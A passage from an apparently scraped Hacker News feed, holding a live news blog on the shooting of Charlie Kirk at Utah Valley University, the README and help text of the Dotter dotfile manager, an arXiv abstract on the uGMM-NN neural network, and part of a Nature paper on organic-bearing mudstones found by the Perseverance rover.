    &lt;p&gt;Kirk is a 31-year-old conservative activist and father of two who helped found Turning Point USA, a prominent nonprofit that activates conservative youth on school campuses.&lt;/p&gt;
    &lt;p&gt;A well-known supporter of President Donald Trump and a close ally of many in his circle, Kirk spoke at the 2024 presidential convention just days after an assassination attempt on Trump.&lt;/p&gt;
    &lt;head rend="h2"&gt;Elected officials react to reports of shooting, ask for thoughts and prayers for Kirk family&lt;/head&gt;
    &lt;p&gt;Lawmakers on both sides of the aisle reacted to reports that Charlie Kirk had been shot, with many sending prayers to the Kirk family.&lt;/p&gt;
    &lt;p&gt;"Pls join me in praying for Charlie Kirk," Sen. Chuck Grassley, R-Iowa, said in a post on X.&lt;/p&gt;
    &lt;p&gt;"Our prayers are with Charlie Kirk," Sen. Ted Cruz, R-Texas, said, also on X.&lt;/p&gt;
    &lt;p&gt;Rep. Marjorie Taylor Greene, R-Ga., wrote in her own post that, "Charlie Kirk has been shot! Pray for him!"&lt;/p&gt;
    &lt;p&gt;Several other senators, who were in and around the U.S. Capitol during the shooting, reacted to the news.&lt;/p&gt;
    &lt;p&gt;"Charlie is a very, actually, a very good friend of mine. It's, it scares you to death for he and his family," Sen. Rick Scott, R-Fla., told reporters,&lt;/p&gt;
    &lt;p&gt;Sen. John Cornyn, R-Texas, told reporters that news of the shooting was, "shocking and tragic."&lt;/p&gt;
    &lt;p&gt;"We’re all praying Charlie is going to be okay," Cornyn added.&lt;/p&gt;
    &lt;p&gt;Among notable Democrats, California Gov. Gavin Newsom also weighed in on X, writing, "The attack on Charlie Kirk is disgusting, vile, and reprehensible. In the United States of America, we must reject political violence in EVERY form."&lt;/p&gt;
    &lt;p&gt;Sen. Ruben Gallego, D-Ariz., also posted about the shooting, writing on X that the news is "horrific."&lt;/p&gt;
    &lt;p&gt;"Let’s hope he is well and keep him and his families in your prayers," Gallego added.&lt;/p&gt;
    &lt;p&gt;Sen. Mark Kelly, D-Ariz., wrote in his own post on X that, "The news that Charlie Kirk was shot while speaking in Utah is shocking and horrible. It’s an example of political violence that has no place in our country."&lt;/p&gt;
    &lt;p&gt;Kelly added that he and his wife, former Rep. Gabby Giffords, who was the victim of a shooting in 2010, are "thinking of him and his family."&lt;/p&gt;
    &lt;p&gt;Sen. Chris Murphy, D-Conn., was giving a speech on the Senate floor this afternoon and addressed reports of the shooting, saying that, "we are all horrified watching images and following the news out of Utah, and we are sending all of our thoughts to Mr. Kirk, to his family, to survivors there."&lt;/p&gt;
    &lt;head rend="h2"&gt;Utah Valley is the state's largest public university&lt;/head&gt;
    &lt;p&gt;While BYU, the University of Utah and Utah Valley are probably the best-known schools in Utah, UVU calls itself the Beehive State’s biggest public university with more than 46,000 students.&lt;/p&gt;
    &lt;p&gt;The school was established in 1941 as Central Utah Vocational School and renamed Utah Valley College in 1993.&lt;/p&gt;
    &lt;p&gt;The Orem institution is about 40 miles south of the state capital, Salt Lake City.&lt;/p&gt;
    &lt;head rend="h2"&gt;Trump addresses shooting&lt;/head&gt;
    &lt;p&gt;President Donald Trump just addressed the shooting on his social media site, Truth Social.&lt;/p&gt;
    &lt;p&gt;"We must all pray for Charlie Kirk, who has been shot," Trump wrote. "A great guy from top to bottom. GOD BLESS HIM!"&lt;/p&gt;
    &lt;head rend="h2"&gt;Suspect in custody, university says&lt;/head&gt;
    &lt;p&gt;A suspect is in custody and police are investigating the shooting, Utah Valley University told students in an alert this afternoon.&lt;/p&gt;
    &lt;head rend="h2"&gt;Videos online show Kirk recoiling after shot heard&lt;/head&gt;
    &lt;p&gt;Videos circulating across social media show the moment a shot is heard in the crowd.&lt;/p&gt;
    &lt;p&gt;Kirk was sat in a tent with the "American Comeback Tour" logo when a shot is heard and Kirk physically recoils, slumping down in his seat. Blood is seen flowing down from his neck and the crowd audibly panics and begins to run.&lt;/p&gt;
    &lt;head rend="h2"&gt;FBI monitoring shooting reports; Vance asks people to pray for Kirk&lt;/head&gt;
    &lt;p&gt;The FBI is closely monitoring reports of a shooting involving Kirk, according to FBI Director Kash Patel.&lt;/p&gt;
    &lt;p&gt;"Our thoughts are with Charlie, his loved ones, and everyone affected," Patel wrote in a post on X. "Agents will be on the scene quickly and the FBI stands in full support of the ongoing response and investigation."&lt;/p&gt;
    &lt;p&gt;Vice President JD Vance responded to reports that Kirk was shot, encouraging others to "say a prayer" for the right-wing activist in a post on X.&lt;/p&gt;
    &lt;head rend="h2"&gt;Kirk on campus for 'American Comeback Tour' appearance&lt;/head&gt;
    &lt;p&gt;Kirk was being hosted by the Utah Valley University chapter of Turning Point USA.&lt;/p&gt;
    &lt;p&gt;The organization's website shows a series of dates at college campuses across the country. The University of Minesosta at Northrop described it as a "high-energy evening featuring a candid conversation about conservative values."&lt;/p&gt;
    &lt;head rend="h2"&gt;Kirk was the only person shot, university says&lt;/head&gt;
    &lt;p&gt;A spokesperson for Utah Valley University said that Kirk was the sole person shot at the event.&lt;/p&gt;
    &lt;head rend="h2"&gt;Sen. Mike Lee says he's 'praying for Charlie Kirk'&lt;/head&gt;
    &lt;head rend="h2"&gt;Charlie Kirk taken off campus after shots heard, university says&lt;/head&gt;
    &lt;p&gt;Turning Point USA founder Charlie Kirk was about 20 minutes into a presentation when witnesses heard shots fired from a nearby building, a spokesperson for Utah Valley University told NBC News.&lt;/p&gt;
    &lt;p&gt;The spokesperson said, to the best of the university's knowledge, Kirk was hit and taken with his security team away from the premises, and the courtyard was cleared.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.nbcnews.com/news/us-news/live-blog/live-updates-shooting-charlie-kirk-event-utah-rcna230437"/></entry><entry><id>https://news.ycombinator.com/item?id=45202252</id><title>Dotter: Dotfile manager and templater written in Rust</title><updated>2025-09-10T20:36:50.256376+00:00</updated><content>&lt;doc fingerprint="b744bc6929a403a1"&gt;
  &lt;main&gt;
    &lt;p&gt;Dotter is a dotfile manager and templater.&lt;/p&gt;
    &lt;p&gt;Dotfiles are configuration files that usually live in the home directory and start with a dot. Often times, it is desirable to have a backup of all the configurations on your system, which is why a lot of users have their dotfiles saved in a git repository, then symlinking them to their target locations using &lt;code&gt;ln -s&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;However, there are several issues with that barebones approach:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Hard to keep track of what comes from where once you have more than a handful of dotfiles&lt;/item&gt;
      &lt;item&gt;Tedious to setup on a new machine - you need to manually create every single link&lt;/item&gt;
      &lt;item&gt;No real way to handle differences between machines - say you want the battery meter on your bar to not appear on your desktop machine&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Dotter aims to solve all those problems by providing a flexible configuration and automatic templating or symlinking to the target locations.&lt;/p&gt;
    &lt;p&gt;Dotter is available on homebrew using &lt;code&gt;brew install dotter&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;The following AUR packages are available:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;dotter-rs-bin for a precompiled version of the latest release&lt;/item&gt;
      &lt;item&gt;dotter-rs for the latest release's source that is built on your machine&lt;/item&gt;
      &lt;item&gt;dotter-rs-git for the latest commit on master that is built on your machine&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;All of those are maintained by orhun - huge thanks to him!&lt;/p&gt;
    &lt;p&gt;Dotter is available on Scoop. Run &lt;code&gt;scoop install dotter&lt;/code&gt; to install the latest release.&lt;/p&gt;
    &lt;p&gt;Download the binary for your platform from the latest release and then put it in your &lt;code&gt;$PATH&lt;/code&gt; or in your dotfile repository (then you'd run it with &lt;code&gt;./dotter&lt;/code&gt;).
Alternatively, Dotter is on crates.io, so if you have Rustup installed, run &lt;code&gt;cargo install dotter&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Check out the wiki for more information. Among other things, it explains how to setup and configure Dotter, as well as giving insight on how the templating and deployment works.&lt;/p&gt;
    &lt;p&gt;Now that you've configured all the global and local file sections, you can simply run &lt;code&gt;dotter&lt;/code&gt; from within your repository.&lt;lb/&gt; All the files will be deployed to their target locations.&lt;/p&gt;
    &lt;p&gt;Check out &lt;code&gt;dotter -h&lt;/code&gt; for the command-line flags that Dotter supports:&lt;/p&gt;
    &lt;code&gt;A dotfile manager and templater written in rust

Usage: dotter [OPTIONS] [COMMAND]

Commands:
  deploy           Deploy the files to their respective targets. This is the default subcommand
  undeploy         Delete all deployed files from their target locations. Note that this operates on all files that are currently in cache
  init             Initialize global.toml with a single package containing all the files in the current directory pointing to a dummy value and a local.toml that selects that package
  watch            Run continuously, watching the repository for changes and deploying as soon as they happen. Can be ran with `--dry-run`
  gen-completions  Generate shell completions
  help             Print this message or the help of the given subcommand(s)

Options:
  -g, --global-config &amp;lt;GLOBAL_CONFIG&amp;gt;
          Location of the global configuration [default: .dotter/global.toml]
  -l, --local-config &amp;lt;LOCAL_CONFIG&amp;gt;
          Location of the local configuration [default: .dotter/local.toml]
      --cache-file &amp;lt;CACHE_FILE&amp;gt;
          Location of cache file [default: .dotter/cache.toml]
      --cache-directory &amp;lt;CACHE_DIRECTORY&amp;gt;
          Directory to cache into [default: .dotter/cache]
      --pre-deploy &amp;lt;PRE_DEPLOY&amp;gt;
          Location of optional pre-deploy hook [default: .dotter/pre_deploy.sh]
      --post-deploy &amp;lt;POST_DEPLOY&amp;gt;
          Location of optional post-deploy hook [default: .dotter/post_deploy.sh]
      --pre-undeploy &amp;lt;PRE_UNDEPLOY&amp;gt;
          Location of optional pre-undeploy hook [default: .dotter/pre_undeploy.sh]
      --post-undeploy &amp;lt;POST_UNDEPLOY&amp;gt;
          Location of optional post-undeploy hook [default: .dotter/post_undeploy.sh]
  -d, --dry-run
          Dry run - don't do anything, only print information. Implies -v at least once
  -v, --verbose...
          Verbosity level - specify up to 3 times to get more detailed output. Specifying at least once prints the differences between what was before and after Dotter's run
  -q, --quiet
          Quiet - only print errors
  -f, --force
          Force - instead of skipping, overwrite target files if their content is unexpected. Overrides --dry-run
  -y, --noconfirm
          Assume "yes" instead of prompting when removing empty directories
  -p, --patch
          Take standard input as an additional files/variables patch, added after evaluating `local.toml`. Assumes --noconfirm flag because all of stdin is taken as the patch
      --diff-context-lines &amp;lt;DIFF_CONTEXT_LINES&amp;gt;
          Amount of lines that are printed before and after a diff hunk [default: 3]
  -h, --help
          Print help
  -V, --version
          Print version
&lt;/code&gt;
    &lt;p&gt;Contributions to Dotter are welcome, whether in the form of a pull request or an issue (for bug repots, feature requests, or other helpful comments)&lt;/p&gt;
    &lt;p&gt;Like what I do and want to encourage me to continue?&lt;lb/&gt; You can donate a small amount via Paypal.&lt;lb/&gt; Donations are not expected but greatly appreciated.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/SuperCuber/dotter"/></entry><entry><id>https://news.ycombinator.com/item?id=45202421</id><title>UGMM-NN: Univariate Gaussian Mixture Model Neural Network</title><updated>2025-09-10T20:36:50.008736+00:00</updated><content>&lt;doc fingerprint="fc1d360addfd808e"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;Computer Science &amp;gt; Machine Learning&lt;/head&gt;&lt;p&gt; [Submitted on 9 Sep 2025]&lt;/p&gt;&lt;head rend="h1"&gt;Title:uGMM-NN: Univariate Gaussian Mixture Model Neural Network&lt;/head&gt;View PDF HTML (experimental)&lt;quote&gt;Abstract:This paper introduces the Univariate Gaussian Mixture Model Neural Network (uGMM-NN), a novel neural architecture that embeds probabilistic reasoning directly into the computational units of deep networks. Unlike traditional neurons, which apply weighted sums followed by fixed nonlinearities, each uGMM-NN node parameterizes its activations as a univariate Gaussian mixture, with learnable means, variances, and mixing coefficients. This design enables richer representations by capturing multimodality and uncertainty at the level of individual neurons, while retaining the scalability of standard feedforward networks. We demonstrate that uGMM-NN can achieve competitive discriminative performance compared to conventional multilayer perceptrons, while additionally offering a probabilistic interpretation of activations. The proposed framework provides a foundation for integrating uncertainty-aware components into modern neural architectures, opening new directions for both discriminative and generative modeling.&lt;/quote&gt;&lt;p&gt; Current browse context: &lt;/p&gt;&lt;p&gt;cs.LG&lt;/p&gt;&lt;head rend="h3"&gt;References &amp;amp; Citations&lt;/head&gt;&lt;p&gt; export BibTeX citation Loading... &lt;/p&gt;&lt;head rend="h1"&gt;Bibliographic and Citation Tools&lt;/head&gt;&lt;p&gt; Bibliographic Explorer (What is the Explorer?) &lt;/p&gt;&lt;p&gt; Connected Papers (What is Connected Papers?) &lt;/p&gt;&lt;p&gt; Litmaps (What is Litmaps?) &lt;/p&gt;&lt;p&gt; scite Smart Citations (What are Smart Citations?) &lt;/p&gt;&lt;head rend="h1"&gt;Code, Data and Media Associated with this Article&lt;/head&gt;&lt;p&gt; alphaXiv (What is alphaXiv?) &lt;/p&gt;&lt;p&gt; CatalyzeX Code Finder for Papers (What is CatalyzeX?) &lt;/p&gt;&lt;p&gt; DagsHub (What is DagsHub?) &lt;/p&gt;&lt;p&gt; Gotit.pub (What is GotitPub?) &lt;/p&gt;&lt;p&gt; Hugging Face (What is Huggingface?) &lt;/p&gt;&lt;p&gt; Papers with Code (What is Papers with Code?) &lt;/p&gt;&lt;p&gt; ScienceCast (What is ScienceCast?) &lt;/p&gt;&lt;head rend="h1"&gt;Demos&lt;/head&gt;&lt;head rend="h1"&gt;Recommenders and Search Tools&lt;/head&gt;&lt;p&gt; Influence Flower (What are Influence Flowers?) &lt;/p&gt;&lt;p&gt; CORE Recommender (What is CORE?) &lt;/p&gt;&lt;p&gt; IArxiv Recommender (What is IArxiv?) &lt;/p&gt;&lt;head rend="h1"&gt;arXivLabs: experimental projects with community collaborators&lt;/head&gt;&lt;p&gt;arXivLabs is a framework that allows collaborators to develop and share new arXiv features directly on our website.&lt;/p&gt;&lt;p&gt;Both individuals and organizations that work with arXivLabs have embraced and accepted our values of openness, community, excellence, and user data privacy. arXiv is committed to these values and only works with partners that adhere to them.&lt;/p&gt;&lt;p&gt;Have an idea for a project that will add value for arXiv's community? Learn more about arXivLabs.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://arxiv.org/abs/2509.07569"/></entry><entry><id>https://news.ycombinator.com/item?id=45202613</id><title>'Clearest sign' yet of ancient life on Mars</title><updated>2025-09-10T20:36:48.374418+00:00</updated><content>&lt;doc fingerprint="ed8d58dde9b183d9"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Abstract&lt;/head&gt;
    &lt;p&gt;The Perseverance rover has explored and sampled igneous and sedimentary rocks within Jezero Crater to characterize early Martian geological processes and habitability and search for potential biosignatures1,2,3,4,5,6,7. Upon entering Neretva Vallis, on Jezero Crater’s western edge8, Perseverance investigated distinctive mudstone and conglomerate outcrops of the Bright Angel formation. Here we report a detailed geological, petrographic and geochemical survey of these rocks and show that organic-carbon-bearing mudstones in the Bright Angel formation contain submillimetre-scale nodules and millimetre-scale reaction fronts enriched in ferrous iron phosphate and sulfide minerals, likely vivianite and greigite, respectively. This organic carbon appears to have participated in post-depositional redox reactions that produced the observed iron-phosphate and iron-sulfide minerals. Geological context and petrography indicate that these reactions occurred at low temperatures. Within this context, we review the various pathways by which redox reactions that involve organic matter can produce the observed suite of iron-, sulfur- and phosphorus-bearing minerals in laboratory and natural environments on Earth. Ultimately, we conclude that analysis of the core sample collected from this unit using high-sensitivity instrumentation on Earth will enable the measurements required to determine the origin of the minerals, organics and textures it contains.&lt;/p&gt;
    &lt;head rend="h2"&gt;Main&lt;/head&gt;
    &lt;p&gt;NASA’s Mars 2020 Perseverance rover mission is the first in a sequence of missions designed to return a scientifically selected suite of Martian rock, regolith and atmosphere samples to Earth for laboratory investigation. The goals of the mission are to explore the Jezero Crater landing site and its surroundings, constrain the geologic history and habitability of the site, seek signs of past life, and prepare a cache of samples for potential return to Earth1. The Perseverance rover carries an instrument payload designed to fulfil these goals, with the capability to characterize rock targets, their submillimetre-scale textural attributes, and potential organic and inorganic biosignatures, placing these features into an outcrop-scale context1.&lt;/p&gt;
    &lt;p&gt;Perseverance has explored three geologic terrains in Jezero Crater (Supplementary Fig. 1): (1) the crater floor, which includes lava flows and igneous cumulates that have experienced aqueous alteration under a variety of conditions2,3; (2) the Western Fan, a sequence of sedimentary rocks derived from mafic to ultramafic sources and deposited in a fluvial-deltaic-lacustrine setting4,5,6; (3) the Margin Unit, a layered-to-massive sequence of rocks with strong orbital spectroscopic signatures of olivine and carbonate that is exposed between the crater rim and the Western Fan7. This study focuses on a suite of rocks exposed in Neretva Vallis, a valley incised through the Jezero Crater rim and Margin Unit, which was the feeder channel for the Western Fan8 (Supplementary Fig. 1). Perseverance initially explored a distinct, bright-toned outcrop exposed on the northern margin of Neretva Vallis. This outcrop area is informally named ‘Bright Angel’ (Fig. 1a). In High Resolution Imaging Science Experiment (HiRISE) images of this deposit, albedo variations appeared to indicate layering at the metre scale. Subsequently, Perseverance explored strata exposed along the southern margin of Neretva Vallis, in an area informally named ‘Masonic Temple’ (Fig. 1a), where rocks with similar characteristics crop out. As described below, the outcrops in these areas share many characteristics and are referred to collectively as the Bright Angel formation. Subsurface structures detected by the Radar Imager for Mars’ subsurface experiment (RIMFAX) ground-penetrating radar (GPR; Methods and Supplementary Fig. 2) can be interpreted to indicate that the Bright Angel formation lies stratigraphically above the Margin Unit, but at the present time, we cannot rule out the possibility that the Bright Angel formation represents a part of an older unit.&lt;/p&gt;
    &lt;head rend="h2"&gt;Outcrop-scale observations&lt;/head&gt;
    &lt;p&gt;The Bright Angel formation consists of approximately metre-scale blocks formed by fracturing and physical weathering of the exposed outcrop (Fig. 1b). In RIMFAX GPR profiles, radar-reflective layers express a range of apparent dip angles, from horizontal up to about 30° at the northern contact with the Margin Unit (Supplementary Fig. 2). The Bright Angel formation appears to be subdivided into concave-upwards to flat-lying bodies of layered rock lying within the Neretva Vallis channel (Supplementary Fig. 2). Assuming that the observed layer orientations formed during deposition of the Bright Angel formation, the topographically highest-standing outcrops near the contact with the Margin Unit are stratigraphically lower than outcrops farther from the contact.&lt;/p&gt;
    &lt;p&gt;A representative example of Bright Angel formation outcrop is visible in the ‘Beaver Falls’ workspace (Fig. 2). Here, the Planetary Instrument for X-ray Lithochemistry (PIXL), Scanning Habitable Environments with Raman and Luminescence for Organics and Chemicals (SHERLOC) and Wide Angle Topographic Sensor for Operations and Engineering (WATSON), SuperCam, and Mastcam-Z instruments (Methods) analysed a rock containing the targets ‘Cheyava Falls’ and ‘Apollo Temple’ and a core sample, named ‘Sapphire Canyon’, was subsequently collected. In this rock, centimetre-scale, reddish-to-tan-coloured, recessive layers are separated by thinner, relatively resistant, light-toned layers (Figs. 2 and 3a). The layers in this rock dip more steeply and strike at an angle to layers in the nearby outcrop, implying that it may have been displaced from its original orientation. Topographically above but stratigraphically below this rock is a darker-toned rock with a coarsely granular texture, the site of the target ‘Steamboat Mountain’ (Fig. 2). This darker-toned rock was investigated as a possible transitional lithology between the Bright Angel formation and the Margin Unit.&lt;/p&gt;
    &lt;p&gt;In general, macroscopic rock textures in the Bright Angel outcrop area are diverse and complex. Intervals of rock are wind-fluted and massive in appearance (Supplementary Fig. 3a), show large (centimetre scale) nodular features (Supplementary Fig. 3b), and are layered and cross-cut by light-toned erosionally resistant and mineralized fractures and veins (Fig. 2 and Supplementary Fig. 3a,b). Primary textures include layered and structureless intervals with limited evidence for transport and deposition by currents, such as cross bedding or plane bed laminations. Across Neretva Vallis, in the Masonic Temple area (Fig. 1a), outcrops express wind-fluted, massive, layered and granular surface textures such as those seen in the Bright Angel area (Supplementary Figs. 4–6). However, the Masonic Temple area also includes poorly sorted conglomerates composed of rounded to subangular millimetre- to centimetre-scale clasts embedded in a fine-grained matrix, as seen in the targets ‘Bass Camp‘ (Supplementary Fig. 7) and ‘Wallace Butte’ (Supplementary Fig. 8a,b).&lt;/p&gt;
    &lt;head rend="h2"&gt;Petrographic relationships&lt;/head&gt;
    &lt;p&gt;Despite the textural diversity of rocks in the Bright Angel formation, they all contain a fine-grained component, or facies, that comprises much of the rock volume. Individual grains in this facies are not visible in WATSON images (17.9–36.3 μm per pixel) or in SHERLOC Autofocus and Context Imager (ACI) images (10.1 μm per pixel) of the Cheyava Falls target (Fig. 3b,c), indicating grains approximately ≤30–110 μm in diameter, that is, finer than coarse silt or very fine sand. The image resolution is insufficient to determine the relative proportions of clay and silt; accordingly, we classify this facies as mudstone. The Masonic Temple conglomerates contain a matrix made of the same mudstone, as well as abundant millimetre- to centimetre-scale clasts, also composed of mudstone (Supplementary Figs. 7 and 8a,b). These clasts formed by mud deposition, partial consolidation, and later erosion and transport as intraclasts.&lt;/p&gt;
    &lt;p&gt;The mud facies is red, tan or whitish-grey coloured in different rocks. These colour differences are apparent in visible-light reflectance spectra collected by Mastcam-Z (Supplementary Fig. 9a,b and Supplementary Table 1) and SuperCam (Supplementary Fig. 10 and Supplementary Table 1). Masonic Temple targets are characterized by long-wavelength spectral features that indicate high abundances of ferric iron. This Fe3+ imparts strong red colouration. Targets in Bright Angel show spectral features that indicate less Fe3+, resulting in tan to whitish-grey colouration. Near-infrared (NIR) absorption spectra collected by SuperCam (Supplementary Fig. 11a–c) are characterized by shallow, approximately 1.92-μm band depths, indicating that Bright Angel formation rocks are weakly hydrated, especially when compared with sedimentary rocks from the Western Fan (Supplementary Fig. 11d and Supplementary Table 1). Other NIR spectral features are also relatively weak and cannot be uniquely attributed to specific minerals; however, candidate phases include phyllosilicate clays and opaline silica, consistent with expectations for a mudstone. Calcium sulfate with spectral features consistent with bassanite, CaSO4·0.5H2O, is also identified in NIR spectra (Supplementary Fig. 11e,f).&lt;/p&gt;
    &lt;p&gt;Organic matter was detected in the Bright Angel area mudstone targets Cheyava Falls, Walhalla Glades and Apollo Temple by the SHERLOC instrument based on the presence of an approximately 1,600-cm−1 G band in the Raman spectra9,10,11,12 (Fig. 3d and Methods). The G band is most intense in Apollo Temple and less intense in Walhalla Glades and Cheyava Falls (Methods). In contrast, no G band was detected at Masonic Temple in the abrasion target ‘Malgosa Crest’. SuperCam Raman spectra collected from Apollo Temple show a strong continuum fluorescence signature (Supplementary Fig. 12) consistent with, but not uniquely attributable to, organic matter; this signature is weak to absent in Malgosa Crest.&lt;/p&gt;
    &lt;p&gt;PIXL micro-X-ray fluorescence (XRF) elemental analyses indicate that Bright Angel formation mudstone is rich in SiO2, Al2O3 and FeO, and poor in MgO and MnO (Supplementary Information). On ternary diagrams used to infer mineralogy (Fig. 4a,b), the mudstone plots in locations consistent with abundant silica and aluminosilicate clays. PIXL analysis of the X-ray diffraction properties of the mudstone in abraded patches (Supplementary Fig. 13a–d) shows that it contains only randomly distributed, low-intensity diffraction peaks with no large domains that exhibit coherent monocrystalline diffraction13,14,15. These properties indicate crystalline domain sizes at or near the PIXL diffraction detection limit of 40–60 μm (ref. 15), in accord with image-based grain size estimates. There is no variation in the crystallinity or textural properties of the mudstone with stratigraphic position or elevation (Supplementary Fig. 13a–d), and thus no evidence for contact metamorphic recrystallization in proximity to adjacent geologic units. Analysis of diffraction peaks detected in calcium-sulfate veins and nodules in three abrasion targets indicates that Ca-sulfate is predominantly non-diffracting as well (Supplementary Figs. 14a–j and 15a–c). Where diffraction was detected and peaks could be indexed13 (Methods and Supplementary Table 2), gypsum and anhydrite were identified in isolated small domains. A possible explanation for the high proportion of non-diffracting Ca-sulfate is that it represents fine-grained bassanite, consistent with SuperCam spectra (Supplementary Fig. 11e,f). On Mars, bassanite is known to form by dehydration of gypsum16, with gypsum precipitation implying low temperature and salinity for Ca-sulfate-precipitating fluids17.&lt;/p&gt;
    &lt;p&gt;Finally, olivine sand grains and particulate and intragranular Fe–Mg carbonate were observed in Cheyava Falls and Steamboat Mountain. In Cheyava Falls, PIXL analysed an approximately 0.5–1-mm-diameter olivine grain in an approximately centimetre-thick, light-toned Ca-sulfate layer (Fig. 3a,b). In Steamboat Mountain, coarse to very coarse sand-sized grains (0.5–2 mm) of olivine and Fe–Mg carbonate are locally surrounded by Ca-sulfate and set within mudstone (Supplementary Fig. 13a–h). Mixing relationships between mudstone, olivine, carbonate and Ca-sulfate are illustrated on Fig. 4a,b. Where coarse-crystalline olivine grains and mudstone are in contact with each other (Supplementary Fig. 13b,f), there is no indication that the mudstone has been recrystallized by interaction with this igneous mineral, indicating that olivine is a detrital phase. In Steamboat Mountain, SHERLOC targeted an area containing olivine, carbonate and Ca-sulfate, rather than mudstone. No organic matter was detected, indicating that these phases are not important carriers of organic matter. SuperCam Raman spectra from the Steamboat Mountain mudstone, however, do show the same continuum fluorescence seen in the organic-matter-bearing Apollo Temple target (Supplementary Fig. 12).&lt;/p&gt;
    &lt;head rend="h2"&gt;Provenance and depositional environments&lt;/head&gt;
    &lt;p&gt;Observations of the Bright Angel outcrop area are consistent with their interpretation as mudstones deposited from suspension as layered and massive beds. Major element systematics and spectroscopic properties indicate that the mudstone provenance was chemically weathered and oxidized, resulting in Si, Al and Fe3+ enrichment and Mg and Mn depletion18. These characteristics are unlike those observed in Western Fan sedimentary rocks, which show little to no fractionation of Fe from Mg or Mn (Supplementary Fig. 16), indicating that they were formed under anoxic conditions18. At the contact with the Margin Unit (Fig. 2), we observe interstratified bedsets containing both fine-grained mudstone and coarse-grained olivine-bearing layers (for example, Cheyava Falls). We also observe poorly sorted, mud-rich olivine- and carbonate-bearing lithologies (for example, Steamboat Mountain). These coarser-grained lithologies appear to have provided a higher permeability medium through which later Ca-sulfate-precipitating fluids could migrate. Given the olivine- and carbonate-rich nature of the Margin Unit7, reworking of grains derived from the Margin Unit into the Bright Angel formation seems plausible. Across Neretva Vallis, at Masonic Temple, the poorly sorted, coarse conglomeratic nature of some outcrops (Supplementary Figs. 7 and 8a,b), and the fine-grained, mud-rich nature of others (Supplementary Fig. 6), indicate significant local or temporal variation in current velocities. Accordingly, we interpret the Bright Angel formation to have formed from sedimentary processes that included weathering, erosion, transport and deposition from water by fallout from suspension and energetic currents or debris flows, forming mudstone and coarser-grained and conglomeratic lithologies, respectively.&lt;/p&gt;
    &lt;head rend="h2"&gt;Nodules and reaction fronts&lt;/head&gt;
    &lt;p&gt;Dispersed throughout the fine-grained mudstone in the Bright Angel outcrop area, we observe approximately 100–200 μm circular to irregularly shaped masses (informally referred to as ‘poppy seeds’ by the Mars 2020 Science Team) that are black to dark blue to dark green coloured in daytime and nighttime white light-emitting diode (LED) illumination (Fig. 3a–c and Supplementary Figs. 17a,b–19a,b). WATSON (Supplementary Figs. 17c–19c) and PIXL Micro Context Camera (MCC; Supplementary Fig. 20) decorrelation stretch images enhance the blue to green colour of these features relative to the mudstone they occur in. PIXL XRF data indicate that the masses are enriched in Fe, P and Zn relative to their host mudstone (Fig. 4c and Supplementary Fig. 21a–g). On a ternary diagram of FeO–P–CaO (Fig. 4c), they extrapolate towards a molar FeO:P ratio of about 3:2 (see also Supplementary Fig. 21f). The X-ray diffraction properties of these masses are indistinguishable from the surrounding mudstone, indicating crystallites smaller than 40–60 μm (Supplementary Fig. 13a–d). In the Apollo Temple abrasion, PIXL analyses also reveal abundant Fe-phosphate masses. The colour properties of some of the Fe-phosphate masses in this target are distinctive: colourless in daytime WATSON images, tan/orange-toned under nighttime white-light LED illumination, and red in decorrelation stretch images relative to the surrounding white–grey mud (Supplementary Fig. 22a–c). Combined, these properties are consistent with accumulations of microcrystalline vivianite (Fe2+3(PO4)2·8H2O) or lower-hydration-state ferrous phosphates (for example, phosphoferrite: Fe2+3(PO4)2·3H2O) and their oxidation products, for example, metavivianite (Fe2+2.5Fe3+0.5(PO4)2·7.5H2O), ferrostrunzite (Fe2+Fe3+2(PO4)2(OH)2·6H2O) and santabarbaraite (Fe3+3(PO4)2(OH)3·5H2O), all of which have molar FeO:P ratios of 3:2 and colour properties that match our observations in Bright Angel.&lt;/p&gt;
    &lt;p&gt;The Fe-phosphate masses do not appear to have been sorted into laminations or lenses of relative enrichment, as might be expected for 100–200 μm accumulations of vivianite co-deposited with finer-grained aluminosilicates and silica. They are thus unlikely to have been transported and deposited as grains along with the surrounding muddy sediment. Instead, the distribution of the Fe-phosphate masses indicates they formed as the result of chemical processes after mudstone deposition and accordingly can be considered authigenic nodules. In the proximity targets ‘Grapevine Canyon’ and Walhalla Glades, Fe-phosphate nodules are encased in larger, centimetre-scale Ca-sulfate nodules (Supplementary Figs. 13h and 20), which are themselves cross-cut by a later generation of light-toned, mineralized fractures (Supplementary Fig. 3b). Fe-phosphate nodule abundances and sizes seem unrelated to their proximity to either generation of Ca-sulfate, indicating that Ca-sulfate nodule and vein emplacement occurred after Fe-phosphate nodule formation. Fe-phosphate is rare in Masonic Temple area targets. A few isolated spots that might contain Fe-phosphate masses were detected by PIXL in the Malgosa Crest abrasion target and WATSON images showed a few large (about 1–5 mm) blue–green masses (Supplementary Fig. 23a–c), but they were not analysed. These could be authigenic nodules of a different scale or transported Fe-phosphate-enriched clasts.&lt;/p&gt;
    &lt;p&gt;A striking feature observed in the Cheyava Falls target (and the corresponding Sapphire Canyon core sample), is distinct spots (informally referred to as ‘leopard spots’ by the Mars 2020 Science Team) that have circular to crenulated dark-toned rims and lighter-toned cores (Fig. 3a–c). The spots range in size from about 200 μm to 1 mm in diameter and their cores are less red than their surrounding mudstone. Like the previously described authigenic nodules they co-occur with, the spots are not concentrated in layers or laminae; together with their irregular shapes, this indicates that they were not deposited as grains. Instead, these multi-coloured features appear to represent in situ reaction fronts.&lt;/p&gt;
